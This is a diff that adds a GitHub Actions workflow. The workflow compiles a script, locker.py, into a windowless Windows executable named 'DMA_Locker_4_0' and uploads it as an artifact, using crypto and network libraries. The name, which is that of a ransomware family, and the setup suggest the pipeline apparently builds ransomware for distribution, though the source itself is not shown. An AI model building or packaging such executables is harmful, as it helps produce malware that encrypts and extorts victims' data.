@@ -1,0 +1,33 @@
+name: Build Windows Executable
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+    - uses: actions/checkout@v3
+    
+    - uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+    
+    - name: Install PyInstaller
+      run: pip install pyinstaller pycryptodome pillow requests
+    
+    - name: Create Windows EXE
+      run: |
+        pyinstaller --onefile `
+          --noconsole `
+          --name "DMA_Locker_4_0" `
+          --hidden-import=Crypto `
+          --hidden-import=Crypto.Cipher `
+          --hidden-import=requests `
+          locker.py
+    
+    - name: Upload EXE
+      uses: actions/upload-artifact@v3
+      with:
+        name: DMA_Locker_EXE
+        path: dist/DMA_Locker_4_0.exe
